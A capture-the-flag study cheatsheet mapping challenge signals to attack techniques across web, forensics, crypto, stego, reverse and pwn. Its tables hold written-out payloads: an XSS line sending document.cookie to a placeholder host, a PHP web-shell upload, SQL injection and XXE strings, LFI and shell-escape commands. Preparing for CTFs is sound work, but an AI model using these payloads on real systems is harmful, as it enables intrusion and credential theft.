# Final review cheatsheet

One-page recall for the event. Signal → pattern. Deep steps live in each [category note](README.md#index); this is the lookup you scan when the clock is running.

Flag format: `H4G{...}`. No AI tools during the event ([rules](event-briefer.md#iv-event-information)) — work by hand.

## Scope & scoring

- **In scope:** OSINT, web, network forensics, misc. Others (crypto, file/disk, stego, reverse, pwn) show up as misc or embedded payloads.
- **Points:** easy 1–30, moderate 31–70, hard 71–100. Clear all easy first, then moderates in your category, hards last.
- **Time-box:** easy 10 min, moderate 20, hard 30. Over budget → log in the doc, hand off, move on.
- Prompt title/filename/points are hints; puns name the technique ("Shift happens" = Caesar, "way back" = Wayback).

## First pass on any file

```sh
file x; exiftool x; strings -n 6 x | grep -i 'H4G{'; binwalk x; xxd x | head
```

Then grep the flag prefix in plain, Base64, hex, ROT13. Odd text → [CyberChef](https://gchq.github.io/CyberChef/) Magic + [dCode identifier](https://www.dcode.fr/cipher-identifier). Trust magic bytes over the extension. Work on a copy.

## OSINT → [note](categories/osint.md)

Passive only. Read, don't log in or attack.

| Seeing | Try |
| --- | --- |
| Username / handle | WhatsMyName / `sherlock`, read bio + linked accounts |
| Photo of a place | `exiftool` GPS first; else reverse-image (Yandex beats Google on faces/non-West), crop one landmark |
| "when was this" | EXIF time, shadow via [SunCalc](https://www.suncalc.org/), dated clues |
| `XXXX+XXX` / lat-long / grid | Plus Code & lat-long → Google Maps; MGRS → [Earth Point](https://www.earthpoint.us/convert.aspx) |
| Domain / company | `whois`, [crt.sh](https://crt.sh/) subdomains, `dig +short txt` (flags in TXT) |
| "find the file/page" | Google dorks: `site:` `filetype:` `intitle:"index of"` |
| Deleted / changed page | [Wayback](https://web.archive.org/), [archive.today](https://archive.ph/), diff old vs new |
| Email | Search quoted, [Gravatar](https://gravatar.com/) by md5, pivot username |
| GitHub user/repo | commit history + closed PRs; append `.patch` for author; `git log -p` for deleted secrets |
| IP | `curl ip-api.com/json/<ip>`, Shodan/Censys cached banners |
| PH person/gov/biz | `.gov.ph`, LGU/barangay FB, SEC/DTI, jeepney routes |

Confirm with two independent signals before submitting.

## Web → [note](categories/web.md)

First: view source + JS, hit `/robots.txt` `/.git/` `/.env` `/admin`, check cookies/JWT in DevTools, fuzz with `ffuf -u URL/FUZZ -w .../common.txt`.

| Seeing | Pattern → first move |
| --- | --- |
| `?id=1` numeric in URL/cookie | IDOR → change the ID (also POST bodies, base64 cookies) |
| `'` breaks a login/query | SQLi → `' OR 1=1-- -`, `UNION SELECT`, else `sqlmap` |
| Input reflected in page | XSS → `<img src=x onerror=fetch('//ID?c='+document.cookie)>` |
| Input in a template | SSTI → probe `{{7*7}}`=49; `{{config}}`, RCE gadget |
| `?page=` `?file=` | LFI → `../../../../etc/passwd`, `php://filter` for source |
| Server fetches a URL | SSRF → `127.0.0.1`, `169.254.169.254` metadata |
| File upload reachable by URL | Upload→RCE → `.phtml`/double ext, `GIF89a;<?php system($_GET['c']);?>` |
| `ping`/`exec`-style input | Cmd injection → `; id`, `$(...)`, `${IFS}` for spaces |
| `eyJ...` token | JWT forgery → `alg:none`, crack weak HS256 secret, RS256→HS256 confusion |
| role/flag in cookie | Auth bypass → flip `role=admin`; Flask → `flask-unsign` |
| XML input (SOAP/SVG/DOCX) | XXE → `<!ENTITY e SYSTEM "file:///flag">` |

Blind? Confirm via time delay or [webhook.site](https://webhook.site/). URL-encode `& # + space`.

## Network forensics → [note](categories/network-forensics.md)

First: `capinfos`, Wireshark **Statistics > Protocol Hierarchy** (names the challenge), **Conversations**, **Export Objects > HTTP**. Broken? `pcapfix -d`. Quick: `strings f.pcap | grep H4G{`.

| Seeing | Try |
| --- | --- |
| HTTP/FTP/SMB downloads | Export Objects, or `tshark -r f --export-objects http,./out` |
| FTP/Telnet/HTTP logins | Follow TCP Stream; HTTP Basic = base64 in `Authorization` |
| Many odd DNS queries | DNS exfil → join subdomain labels, decode hex/base32/64 |
| TLS + a key/log file | Load keylog/RSA key in TLS prefs, then export objects |
| `URB`/USB packets | HID decode → `usb.capdata`, 8-byte reports, HID usage table |
| 802.11 + EAPOL handshake | `aircrack-ng -w rockyou.txt`, add key in 802.11 prefs |
| Uniform ICMP/timing, odd fields | Covert channel → two values = bits, group to bytes |
| Readable IRC/SMTP/plain TCP | Follow the stream; scan every conversation |

Extracted file is usually the real challenge → pivot to stego/crypto.

## Misc → [`ctf-misc` skill](.agents/skills/ctf-misc/SKILL.md)

In scope and a catch-all. If it fits no other category, it's here. First: `file`, `xxd | head`, check charset, check byte length vs visible length.

| Seeing | Try |
| --- | --- |
| `A-Z2-7=` / base58 / base85 / dots-dashes | base32/58/85, Morse — CyberChef Magic (intensive) chains layers |
| Geometric symbols / adjacent-key gibberish | Pigpen, keyboard-shift — [dCode identifier](https://www.dcode.fr/cipher-identifier) |
| CSV/numeric column, values 48–126 | ASCII codes → `chr(int(x))`; CyberChef "From Decimal" |
| List of floats | raw bytes → `struct.pack('>f', x)` per value, decode |
| Text looks normal but byte length too long | Unicode stego → variation selectors `U+E0100+` / tag block `U+E0000+`; subtract offset. Detect `[hex(ord(c)) for c in text]` |
| CJK mojibake, "translate"/"endian" | UTF-16 endian swap: `s.encode('utf-16-be').decode('utf-16-le')` |
| QR / barcode | `zbarimg`; MaxiCode → zxing; repair finder squares in GIMP |
| `python3 -c`-style prompt, restricted input | pyjail → `().__class__.__base__...`, `''.join(['fl','ag'])`, walrus `(x:="...")` |
| Restricted/rbash shell | bashjail → `HISTFILE=/flag bash; history`, `bash -v flag`, `${IFS}`, `/bin/sh` paths |
| "guess the number/word" oracle (length/compare/edit distance) | binary search; Levenshtein oracle → length then per-char |
| Key/boolean/constraint validation | Z3 → model each constraint, `s.check()`, read model |
| Odd DNS (ECS, NSEC, IXFR, rebinding, long subdomains) | see [misc dns notes](.agents/skills/ctf-misc/dns.md) / network DNS exfil |
| Shell on a box, need root | `sudo -l`, `find / -perm -4000 2>/dev/null` + [GTFObins](https://gtfobins.github.io/); `docker` group = instant root |
| MAC = `hash(secret‖msg)`, known msg+hash | length extension (`hlextend`) — works on MD5/SHA1/SHA256, **not** HMAC |
| Audio tones / noise | spectrogram (`sox ... -n spectrogram`), DTMF, SSTV (`qsstv`), Morse on one channel |

## Crypto & encoding → [note](categories/crypto.md)

Identify before attacking: CyberChef Magic, [dCode](https://www.dcode.fr/). Charset tells you: `A-Z` classical, `A-Za-z0-9+/=` base64, `0-9a-f` hex, huge int RSA. `H4G{` is the crib for XOR/shift/key.

| Seeing | Try |
| --- | --- |
| Shifted letters, readable-ish | Classical → ROT brute, Vigenère (dCode Kasiski), quipqiup |
| base64/hex/binary/morse | Encoding → decode, chain via Magic intensive |
| Two cts or repeating-key hint | XOR → prefix crib, brute single byte, `xortool`, crib-drag |
| `n`,`e`,`c` big ints | RSA → [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool), [factordb](https://factordb.com/), small-e cube root |
| 32/40/64 hex, "crack this" | Hash → [crackstation](https://crackstation.net/), `hashcat -m <mode>` |
| Repeating 16-byte blocks | AES-ECB → byte-at-a-time oracle, cut-and-paste |
| Padding error + IV | AES-CBC → bit-flip, padding oracle |

Convert final integer to bytes (`long_to_bytes`). Regional crypto is usually classical / encoding / textbook RSA — don't reach for lattices.

## File & disk forensics → [note](categories/file-forensics.md)

`file` + `exiftool` + `binwalk` + `strings` solves a large share.

| Seeing | Try |
| --- | --- |
| `.zip/.rar/.7z/.tar.gz` | `7z x`; pw zip → `fcrackzip -u -D -p rockyou.txt` or `zip2john`+john |
| `.dd/.E01/.img/.raw` | Autopsy, or `mmls`→`fls -r`→`icat` (deleted = `*`) |
| Won't open / odd magic | Compare `xxd` header to signatures, rename/fix magic, `pngcheck` |
| binwalk shows embeds | `binwalk -e`, else `foremost`; recurse |
| `.pdf/.docx/.xlsx` | `exiftool`, `pdf-parser`/`peepdf`, office=zip → XML + `olevba` macros |
| `.raw/.mem/.vmem` | Volatility 3 `windows.info/pslist/cmdline`; try `strings` first |

Payload is often appended after a valid file or in a deleted/slack region.

## Stego → [note](categories/stego.md)

Metadata + `strings` before any stego tool. Image → [Aperi'Solve](https://www.aperisolve.com/) (runs zsteg/steghide/binwalk/planes). Audio → spectrogram.

| Seeing | Try |
| --- | --- |
| PNG / BMP | `zsteg -a`, StegSolve bit planes (try bit 1) |
| JPG / WAV + pw hint | `steghide extract -p ''`, else `stegseek x rockyou.txt` |
| Audio | Spectrogram (log scale), DTMF/Morse, WavSteg/DeepSound |
| Odd colors / "look closer" | StegSolve maps, max contrast, invert, split channels, fix PNG height |
| Video | `ffmpeg -i x %04d.png` scan frames, `ffprobe` streams |
| QR / barcode | `zbarimg`, repair finder squares in GIMP, flip if mirrored |

## Reverse → [note](categories/reverse.md)

`strings` + `ltrace` + `strace` solve easy ones first. Read Ghidra's decompiled C. Run unknown binaries only in a VM.

| Seeing | Try |
| --- | --- |
| Native ELF/EXE asks input | Ghidra `main`, find win condition |
| `strcmp` in `ltrace` | Compare leak → 2nd arg is the answer |
| Input transformed then checked | Reverse the check; invert, or Z3/angr |
| "wrong" branch gates flag | Patch jump (`r2 -w`, NOP `jne`) |
| UPX / high entropy | `upx -d`, else dump memory post-unpack |
| .NET/Java/Python/Go/WASM | dnSpy / jd-gui / decompyle3 / GoReSym / wasm2wat |
| `.apk` | jadx `MainActivity`, `apktool`, native `.so` → ELF |

## Pwn → [note](categories/pwn.md)

`checksec` first (NX/PIE/canary/RELRO pick the attack). Find offset with cyclic. Dev local → flip to remote, match libc exactly. Let pwntools do the work.

| Seeing | Try |
| --- | --- |
| Unbounded `gets`/`read` + `win()` | ret2win → `'A'*off + p64(win)` (+`ret` for alignment) |
| Overflow, no win, libc | ret2libc → leak `puts@got`, [libc.rip](https://libc.rip/), `system('/bin/sh')` |
| `printf(user_input)` | Format string → `%n$p` to find offset, `fmtstr_payload` |
| Canary + overflow | Leak canary, replay it unchanged in overflow |
| NX off, jump to input | Shellcode → `asm(shellcraft.sh())`, avoid bad bytes |
| Overflow, NX on | ROP → `ROPgadget`/`ROP(e)`, keep stack aligned |
| malloc/free, UAF/double-free | Heap → tcache poison → hook/pointer; attempt last |

## Recent vulns → [note](cves.md)

Fingerprint the stack (`Server`, `X-Powered-By`, version strings), match a version to a known CVE, run a public PoC against the authorized target only. See [cves.md](cves.md) for the current ~12-month list (React2Shell, Langflow RCE, pac4j-jwt, Authlib `alg:none`, Gitea proxy trust, etc.).

## Reminders

- Grep `H4G{` early and in every encoding before deep tooling.
- Flags hide in metadata, bios, alt text, TXT records, slack space, old snapshots — not the obvious spot.
- One Google Doc per challenge: commands, output, dead ends. Keep it transferable.
- Stay inside the authorized environment ([conduct](event-briefer.md#v-code-of-conduct)).
- Platform is likely CTFd: submit through the site; API navigation (token auth, challenge list) in [ctfd-navigation](.agents/skills/ctf-misc/ctfd-navigation.md).
</content>
</invoke>
